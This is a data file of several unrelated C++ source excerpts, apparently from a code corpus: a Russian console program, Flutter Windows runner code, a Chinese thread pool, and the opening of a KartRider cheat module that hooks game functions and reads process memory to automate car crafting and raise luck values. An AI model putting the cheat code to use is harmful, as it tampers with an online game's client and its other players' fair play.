\u0432\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u043e.\n\n    int number, exponent;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0447\u0438\u0441\u043b\u043e: \";\n    std::cin >> number;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0435\u043f\u0435\u043d\u044c: \";\n    std::cin >> exponent;\n\n    powers(number, exponent);\n   \n\n        return 0;\n    }\n\n\n    // \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: CTRL+F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u043a \u0431\u0435\u0437 \u043e\u0442\u043b\u0430\u0434\u043a\u0438\"\n// \u041e\u0442\u043b\u0430\u0434\u043a\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u043e\u0442\u043b\u0430\u0434\u043a\u0443\"\n\n// \u0421\u043e\u0432\u0435\u0442\u044b \u043f\u043e \u043d\u0430\u0447\u0430\u043b\u0443 \u0440\u0430\u0431\u043e\u0442\u044b \n//   1. \u0412 \u043e\u043a\u043d\u0435 \u043e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0439 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0438 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0438\u043c\u0438.\n//   2. \u0412 \u043e\u043a\u043d\u0435 Team Explorer \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0438\u0441\u0442\u0435\u043c\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n//   3. \u0412 \u043e\u043a\u043d\u0435 \"\u0412\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0432\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u0431\u043e\u0440\u043a\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f.\n//   4. \u0412 \u043e\u043a\u043d\u0435 \"\u0421\u043f\u0438\u0441\u043e\u043a \u043e\u0448\u0438\u0431\u043e\u043a\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438.\n//   5. \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430, \u0438\u043b\u0438 \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430.\n//   6. \u0427\u0442\u043e\u0431\u044b \u0441\u043d\u043e\u0432\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0435\u043a\u0442 \u043f\u043e\u0437\u0436\u0435, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u0424\u0430\u0439\u043b\" > \"\u041e\u0442\u043a\u0440\u044b\u0442\u044c\" > \"\u041f\u0440\u043e\u0435\u043a\u0442\" \u0438 \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 SLN-\u0444\u0430\u0439\u043b.\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"base64\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff\n#include \"../struct.h\"\n#include \"../resource.h\"\n#include \"../helper/DbgPrint.h\"\n#include \"../KartRider.hpp\"\n#include \"../helper/detoursHlper.hpp\"\n#include \"../helper/aobscan/aobscan.hpp\"\n\n\n\n#define DbgPrint2\n// #define DbgPrint2 MyDbgPrintFun\n\nextern HWND g_GamehWnd;\nextern HMODULE g_hModule;\nextern HMODULE g_hModule;\nextern DWORD g_BaseAddress;\nextern DWORD g_BaseAddress1;\nextern LPCDLGTEMPLATEW pDlgtmp_Dialog_Exchange;\n\nnamespace ExchangeSystem\n{\n\tHWND hDlg;\n\tHWND hGameWnd;\n\tHWND hWnd_combox_carnum;\n\tHWND hWnd_combox_lucky;\n\tHWND hWnd_edit_carnum;\n\tHWND hWnd_edit_lockpage;\n\tHWND hWnd_edit_delay;\n\tHWND hWnd_edit_addcar_name;\n\tHWND hWnd_edit_addcar_code;\n\n\tHWND hWnd_list_filter;\n\tHWND hWnd_check_begin;\n\tHWND hWnd_check_lucky;\n\tHWND hWnd_check_cchresult;\n\tHWND hWnd_check_showcarnum;\n\tHWND hWnd_check_lockpage;\n\tHWND hWnd_check_filter;\n\tHWND hWnd_check_filter_show;\n\tHWND hWnd_check_filter_Engine_V1;\n\tHWND hWnd_check_filter_Engine_X;\n\tHWND hWnd_check_filter_Engine_9;\n\tHWND hWnd_check_filter_Engine_HTNew;\n\tHWND hWnd_check_filter_Engine_HT;\n\tHWND hWnd_check_filter_Engine_Z7;\n\tHWND hWnd_check_filter_Engine_SR;\n\tHWND hWnd_check_filter_Engine_PRO;\n\tHWND hWnd_check_filter_attribute_red;\n\tHWND hWnd_check_filter_attribute_gold;\n\tHWND hWnd_check_filter_attribute_purple;\n\tHWND hWnd_check_filter_attribute_white;\n\tHWND hWnd_check_filter_upcar;\n\n\tHWND hWnd_check_kartup;\n\tHWND hWnd_check_kartup_showcarnum;\n\tHWND hWnd_check_kartup_lucky;\n\tHWND hWnd_check_kartup_lockpage;\n\tHWND hWnd_combox_kartup_lucky;\n\tHWND hWnd_edit_kartup_carnum;\n\tHWND hWnd_edit_kartup_lockpage;\n\tHWND hWnd_edit_kartup_delay;\n\tHWND hWnd_check_disasse_kart;\n\tHWND hWnd_check_disasse_lockpage;\n\tHWND hWnd_check_disasse_shownum;\n\tHWND hWnd_edit_disasse_carnum;\n\tHWND hWnd_edit_disasse_page;\n\tHWND hWnd_edit_disasse_delay;\n\n\tHWND hWnd_edit_log;\n\n\tDWORD ExchangeSystemDialog;\n\tDWORD DisassembleStage;\n\tDWORD PrKartLevelUp;\n\tDWORD oldPrKartLevelUp;\n\tDWORD KartLevelUpDialog;\n\tDWORD KartLevelUpResultDialog;\n\tDWORD KartLevelUpResultDialog_animati;\n\n\tDWORD \u5408\u6210\u8ba1\u6570 = 0;\n\tDWORD \u53d6\u8f66\u5b50\u5f15\u64ce\u53c2\u6570;\n\tDWORD \u53d6\u8f66\u5b50\u5f15\u64ce\u51fd\u6570;\n\tDWORD \u53d6\u7269\u54c1\u540dcall;\n\n\tDWORD \u5408\u6210\u7ed3\u679c\u5730\u5740;\n\tDWORD \u5408\u6210\u7ed3\u679c\u5730\u57401;\n\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86\u5b8c\u6bd5;\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86\u5b8c\u6bd51;\n\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f861;\n\tDWORD \u5408\u6210\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c1;\n\n\tDWORD \u53d6\u8f66\u5b50\u5347\u7ea7\u4fe1\u606f;\n\tDWORD \u53d6\u8f66\u5b50\u5347\u7ea7\u4fe1\u606f\u53c2\u6570;\n\n\tDWORD \u5408\u6210_\u8fc7\u6389\u786e\u8ba4\u6846;\n\tDWORD64 \u5408\u6210_\u8fc7\u6389\u786e\u8ba4\u6846\u539f\u59cb\u6570\u636e;\n\tDWORD \u5408\u6210_\u7ffb\u9875CALL;\n\tDWORD \u5408\u6210_\u5224\u65ad\u8f66\u5b50;\n\tDWORD \u5408\u6210_\u5224\u65ad\u8f66\u5b50\u8df3\u8f6c;\n\tDWORD \u5408\u6210_\u5f00\u59cb\u5408\u6210;\n\tDWORD \u5408\u6210_\u5f00\u59cb\u5408\u6210\u8df3\u8f6c;\n\tDWORD \u5408\u6210_\u8f66\u5b50\u504f\u79fb;\n\tDWORD \u5408\u6210_\u9875\u6570\u504f\u79fb;\n\tDWORD \u5408\u6210_\u9501\u5b9a\u5408\u6210\u8f66\u5b50\u6570;\n\tDWORD \u5408\u6210_\u52a8\u753b\u901f\u5ea6;\n\n\tDWORD \u5347\u7ea7_\u7981\u6b62\u5220\u9664\u5f85\u5347\u7ea7\u8f66\u8f86;\n\tDWORD \u5347\u7ea7_\u8fc7\u6ee4\u8f66\u5b50;\n\tDWORD \u5347\u7ea7_\u8fc7\u6ee4\u8f66\u5b50\u8df3\u8f6c;\n\tDWORD \u5347\u7ea7_\u8fc7\u6ee4\u8f66\u5b50\u5b8c\u6bd5;\n\tDWORD \u5347\u7ea7_\u63d0\u9ad8\u5e78\u8fd0\u70b9;\n\n\tDWORD \u6539\u88c5_\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u6539\u88c5_\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\tDWORD \u52a0\u70b9_\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u52a0\u70b9_\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\tDWORD \u90e8\u4ef6_\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u90e8\u4ef6_\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\n\tDWORD \u5206\u89e3_\u8fc7\u6ee4\u8f66\u8f86;\n\tDWORD \u5206\u89e3_\u8fc7\u6ee4\u8f66\u8f86\u8df3\u8f6c;\n\tDWORD \u5206\u89e3_\u8fc7\u6ee4\u8f66\u8f86\u5b8c\u6bd5;\n\tDWORD \u5206\u89e3_\u7981\u7528\u64a4\u9500;\n\tDWORD \u5206\u89e3_\u8df3\u8fc7\u5206\u89e3\u52a8\u753b;\n\tDWORD \u5206\u89e3_\u5269\u4f59\u8ba1\u6570\u504f\u79fb;\n\tDWORD \u5206\u89e3_\u8df3\u8fc7\u4fe1\u606f\u63d0\u793a;\n\tDWORD \u5206\u89e3_\u8df3\u8fc7\u4fe1\u606f\u63d0\u793a_\u624b\u7eed\u8d39;\n\n\tstruct kartupslot\n\t{\n\t\tDWORD garagecard;\n\t\tDWORD itemkart;\n\n\t} kartupslotinfo;\n\n\tstruct Filtercar\n\t{\n\t\tBOOL Filter_upcar;\n\t\tBOOL Filter_V1;\n\t\tBOOL Filter_X;\n\t\tBOOL Filter_9;\n\t\tBOOL Filter_HTNew;\n\t\tBOOL Filter_HT;\n\t\tBOOL Filter_Z7;\n\t\tBOOL Filter_SR;\n\t\tBOOL Filter_PRO;\n\t\tBOOL Filter_ultimate;\n\t\tBOOL Filter_rare;\n\t\tBOOL Filter_advanced;\n\t\tBOOL Filter_general;\n\t\tBOOL Filter_listhide;\n\t\tBOOL Filter_listshow;\n\t} g_Filtercar = {FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE};\n\n\tHANDLE hThread_Exchange;\n\tHANDLE hThread_kartlevelup;\n\tHANDLE hThread_disasse;\n\n\ttypedef struct _ExchangeData\n\t{\n\t\tint \u6bcf\u6b21\u5408\u6210\u8f66\u5b50\u6570\u91cf;\n\t\tint \u5e78\u8fd0\u503c;\n\t\tbool \u5224\u65ad\u5408\u6210\u7ed3\u679c;\n\t\tint \u5217\u8868\u8f66\u5b50\u6570\u91cf;\n\t\tint \u9501\u5b9a\u9875\u6570;\n\t\tint \u5ef6\u65f6;\n\t\tBOOL \u5f00\u59cb\u542f\u52a8;\n\t\tint \u8f66\u5b50\u8ba1\u6570;\n\t\tint \u679a\u4e3e\u6570\u91cf;\n\t} ExchangeData;\n\ttypedef struct _\u5408\u6210\u5750\u6807\u4fe1\u606f\n\t{\n\t\tPOINT \u8f66\u8f86\u663e\u793a\u5750\u6807;\n\t\tPOINT \u5f00\u59cb\u5408\u6210\u5750\u6807;\n\t\tPOINT \u901a\u7528\u662f\u5426\u5750\u6807;\n\t\tPOINT \u5408\u6210\u786e\u5b9a\u5750\u68071;\n\t\tPOINT \u5408\u6210\u786e\u5b9a\u5750\u68072;\n\t\tPOINT \u5347\u7ea7\u5f00\u59cb\u5750\u6807;\n\t\tPOINT \u5347\u7ea7\u786e\u5b9a\u5750\u6807;\n\t\tPOINT \u5206\u89e3\u5f00\u59cb\u5750\u6807;\n\n\t} \u5408\u6210\u5750\u6807\u4fe1\u606f;\n\n\t\u5408\u6210\u5750\u6807\u4fe1\u606f \u5408\u6210\u5750\u6807;\n\tExchangeData ed;\n\tstd::vector<POINT> \u5750\u6807\u6570\u7ec4;\n\tstd::vector<POINT> \u5206\u89e3\u5750\u6807\u6570\u7ec4;\n\n\tstd::vector<DWORD> \u8fc7\u6ee4\u8f66\u5b50\u5217\u8868;\n\n\tvoid \u5f00\u59cb\u505c\u6b62\u5408\u6210(BOOL status);\n\tvoid \u5f00\u59cb\u505c\u6b62\u8f66\u8f86\u5347\u7ea7(BOOL status);\n\n\tHWND WINAPI GetGameHwnd()\n\t{\n\t\tHWND result = 0;\n\t\tWCHAR classNam[MAX_PATH];\n\t\tmemset(classNam, 0, sizeof(classNam));\n\t\tDWORD ProcessId = 0;\n\t\tfor (HWND hWnd = FindWindowEx(0, 0, nullptr, nullptr);\n\t\t\t hWnd != 0;\n\t\t\t hWnd = FindWindowEx(0, hWnd, nullptr, nullptr))\n\t\t{\n\t\t\tGetWindowThreadProcessId(hWnd, &ProcessId);\n\t\t\tif (ProcessId == GetCurrentProcessId())\n\t\t\t{\n\t\t\t\tGetClassName(hWnd, classNam, MAX_PATH * sizeof(WCHAR));\n\t\t\t\tif (lstrcmpi(classNam, L\"PopKart Client\") == 0 ||\n\t\t\t\t\tlstrcmpi(classNam, L\"KartRider Client\") == 0 ||\n\t\t\t\t\tlstrcmpi(classNam, L\" Client\") == 0)\n\t\t\t\t\tresult = hWnd;\n\t\t\t}\n\t\t}\n\t\treturn result;\n\t}\n\n\tDWORD __stdcall getgamestage(DWORD base)\n\t{\n\t\tDWORD result = 0;\n\t\ttry\n\t\t{\n\t\t\tresult = *reinterpret_cast<DWORD *>(*reinterpret_cast<DWORD *>(base));\n\t\t}\n\t\tcatch (...)\n\t\t{\n\t\t}\n\t\treturn result;\n\t}\n\n\tSHORT __stdcall getupkartcode(DWORD base, DWORD garagecard, DWORD itemkart, DWORD type)\n\t{\n\t\tSHORT result = 0;\n\t\ttry\n\t\t{\n\t\t\tauto gc = *reinterpret_cast<DWORD *>(*reinterpret_cast<DWORD *>(base) + garagecard + (type == 1 ? 0 : 4));\n\t\t\tif (gc != 0)\n\t\t\t{\n\t\t\t\tauto ik = *reinterpret_ca",
    "\ufeff// ThreadPool.cpp : \u6b64\u6587\u4ef6\u5305\u542b \"main\" \u51fd\u6570\u3002\u7a0b\u5e8f\u6267\u884c\u5c06\u5728\u6b64\u5904\u5f00\u59cb\u5e76\u7ed3\u675f\u3002\n//\n\n#include <iostream>\n#include<functional>\n\n#include\"threadpool.h\"\n\nconst int TASKQUE_MAX_THRESHOLD = 1024;\nconst int THREAD_MAX_THRESHHOLD = 10;\nconst int THREAD_MAX_IDLE_TIME = 10;\n//\u4efb\u52a1\u7c7b\u65b9\u6cd5\nTask::Task()\n    :result_(nullptr)\n{}\nTask::~Task()\n{}\nAny Task::run()\n{\n    std::cout << \"\u4efb\u52a1\u6267\u884c\" << std::endl;\n    return \"aa\";\n}\nvoid Task::exec()\n{\n    if (result_ != nullptr)\n    {\n        result_->setVal(run()); //\u6267\u884c\u4efb\u52a1\uff0c\u4efb\u52a1\u7ed3\u679c\u653e\u5165result\u5bf9\u8c61\u4e2d\n    }\n}\nvoid Task::setResult(Result* result)\n{\n    result_ = result;\n}\n\n//\u6784\u9020\u51fd\u6570\nThreadPool::ThreadPool()\n    :initThreadSize_(4)\n    , taskSize_(0)\n    , taskQueMaxThreshold_(TASKQUE_MAX_THRESHOLD)\n    ,threadMaxThreshHold_(THREAD_MAX_THRESHHOLD)\n    , mode_(MODE_FIXED)\n    , isRunning(true)\n    ,idleThreadSize_(0)\n    ,curThreadSize_(0)\n{}\n//\u6790\u6784\u51fd\u6570\nThreadPool::~ThreadPool()\n{\n    //\u6ca1\u6709new\u5c31\u4e0d\u7528\u6790\u6784\n    isRunning = false;\n    notEmpty.notify_all();\n   // \u7b49\u5f85\u6240\u6709\u4efb\u52a1\u8fd4\u56de \uff0c\u6709\u4e24\u79cd\u72b6\u6001\uff0c\u963b\u585e&\u6267\u884c\u4e2d\n    std::unique_lock<std::mutex> lock(taskQueMtx);\n    exitable.wait(lock, [&]()->bool {return _threads.size() == 0; });\n\n}\n//\u8bbe\u7f6e\u4efb\u52a1\u961f\u5217\u6700\u5927\u9608\u503c\nvoid ThreadPool::setTaskQueMaxThreshold(int maxThreshold)\n{\n    if (checkRunningState()) {\n        return;\n    }\n\ttaskQueMaxThreshold_ = maxThreshold;\n}\n//\u8bbe\u7f6e\u7ebf\u7a0b\u6570\u91cf\u6700\u5927\u9608\u503c\nvoid ThreadPool::setThreadMAxThreshold(int maxThreshold) {\n    if (checkRunningState()) {\n        return;\n    }\n    if(mode_ == PoolMode::MODE_FIXED) threadMaxThreshHold_ = maxThreshold;\n}\n//\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u6a21\u5f0f\nvoid ThreadPool::setPoolMode(PoolMode mode)\n{\n    if (isRunning == true) {\n        mode_ = mode;\n    }\n\t\n}\n\nbool ThreadPool::checkRunningState() const {\n    return isRunning;\n}\n\n//\u5411\u4efb\u52a1\u961f\u5217\u4e2d\u63d0\u4ea4\u4efb\u52a1\nResult ThreadPool::submitTask(std::shared_ptr<Task> task)\n{\n    std::unique_lock<std::mutex> lock(taskQueMtx);\n    if (Taskque.size() >= taskQueMaxThreshold_)\n    {\n        if (notFull.wait_for(lock, std::chrono::seconds(1))==std::cv_status::timeout )\n        {\n\t\t\tstd::cout << \"\u4efb\u52a1\u961f\u5217\u5df2\u6ee1\uff0c\u63d0\u4ea4\u4efb\u52a1\u5931\u8d25\" << std::endl;\n      \n            return Result(task,false);\n\t\t}\n\t}\n    Taskque.push(task);\n    taskSize_++;\n    \n    //return task->getResult();//\u8fd9\u79cd\u662fResult\u5bf9\u8c61\u662f\u5c5e\u4e8etask\u7684\uff0ctask\u5728\u88ab\u7ebf\u7a0b\u6267\u884c\u5b8c\u6bd5\u540e\u4f1a\u88ab\u91ca\u653e\n                                            //\u8fd9\u79cd\u4e0d\u884c\uff0c\u5728task\u6790\u6784\u65f6\uff0c\u4f1a\u91ca\u653eresult\u5bf9\u8c61\uff0c\u5bfc\u81f4result\u5bf9\u8c61\u88ab\u91ca\u653e\n    if (mode_ == PoolMode::MODE_CACHED\n        && taskSize_ > idleThreadSize_\n        && curThreadSize_ < threadMaxThreshHold_) \n    {\n        auto ptr = std::make_unique<Thread>(std::bind(&ThreadPool::ThreadFunc, this,std::placeholders::_1));\n        int threadID = ptr->getThreadID();\n        _threads.emplace(threadID,std::move(ptr));\n        _threads[threadID]->start();\n        curThreadSize_++;\n        idleThreadSize_++;\n    }\n    notEmpty.notify_one();\n    return Result(task,true);//\u8fd9\u79cd\u662fResult\u5bf9\u8c61\u662f\u5c5e\u4e8eThreadPool\u7684\uff0c\u4e0d\u4f1a\u88ab\u91ca\u653e\n    \n}\n\n//\u542f\u52a8\u7ebf\u7a0b\u6c60\nvoid ThreadPool::start(size_t initThreadSize)\n{\n    //\u8bbe\u7f6e\u7ebf\u7a0b\u6c60\u7684\u521d\u59cb\u8fd0\u884c\u72b6\u6001\n    isRunning = true;\n    //\u8bbe\u7f6e\u521d\u59cb\u7ebf\u7a0b\u4e2a\u6570\n    initThreadSize_ = initThreadSize;\n    curThreadSize_ = initThreadSize;\n\t//\u521b\u5efa\u7ebf\u7a0b\n    for (size_t i = 0; i < initThreadSize_; i++)\n    {\n       \n        auto ptr = std::make_unique<Thread>(std::bind(&ThreadPool::ThreadFunc, this, std::placeholders::_1));\n        std::cout << \"threadid:\" << ptr->getThreadID() << \"create()\" << std::endl;\n        int threadId = ptr->getThreadID();\n\t\t//_threads.push_back(std::move(ptr));\n        _threads.emplace(threadId, std::move(ptr));\n\t}\n    //\u542f\u52a8\u7ebf\u7a0b\n    for (size_t i = 0; i < initThreadSize_; i++)\n    {\n\t\t_threads[i]->start();\n        //\u8bbe\u7f6e\u7a7a\u95f2\u7ebf\u7a0b\u7684\u6570\u91cf\n        idleThreadSize_ ++;\n\t}\n}\nint Thread::generatedId_ = 0;\nvoid ThreadPool::ThreadFunc(int threadid)\n{\n    auto lastTime = std::chrono::high_resolution_clock().now();\n    std::cout << \"ThreadFunc\u51fd\u6570\u5f00\u59cb\u6267\u884c,\u672c\u7ebf\u7a0b\u53f7\u4e3a\"<<std::this_thread::get_id() <<\"\\n\" << std::endl;\n    std::cout << \"\u73b0\u5728\u6709\" << this->curThreadSize_<<\"\u4e2a\u7ebf\u7a0b\" << \"\\n\" << std::endl;\n\n    while (isRunning == true)\n    {\n\t\tstd::shared_ptr<Task> task;\n\n        //\u6b64\u5904\u4ee3\u7801\u5757\u7528\u4e8e\u51cf\u5c0f\u9501\u7684\u4f5c\u7528\u57df\uff0c\u63d0\u9ad8\u6548\u7387\n        {\n            std::unique_lock<std::mutex> lock(taskQueMtx);\n            